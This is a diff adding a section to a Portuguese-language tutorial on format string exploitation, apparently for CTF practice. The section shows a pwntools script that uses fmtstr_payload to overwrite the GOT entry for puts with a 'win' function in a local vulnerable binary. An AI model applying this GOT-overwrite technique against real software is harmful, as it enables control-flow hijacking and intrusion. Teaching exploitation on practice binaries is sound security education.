@@ -251,3 +251,24 @@ AAAA.%x.%x.%x.%x.%x.%x
 - `%8$hn`: Acessa o 8º "argumento" (segundo endereço: 0x404022)
   - Escreve o total de bytes impressos (57005 = `0xdead`)
   - No endereço `0x404022`
+
+## Arbitrary Write (%) com Pwntools
+
+O pwntools possui um módulo para facilitar o arbitrary write por %`n`, e tende a ser muito mais fácil de utilizar.
+
+```py
+from pwn import *
+
+context.binary = elf = ELF('./vuln')
+
+offset = 7  # Posição onde o buffer começa nos argumentos (AAAA.%1$p %2$p %3$p... %7$p)
+# Aqui, supõe-se que AAAA começa no resgate do 7° argumento
+
+writes = {
+    elf.got['puts']: elf.sym['win']  # {endereço_alvo: novo_valor}
+}
+
+# Gera e envia o payload
+payload = fmtstr_payload(offset, writes)
+p.sendline(payload)
+```
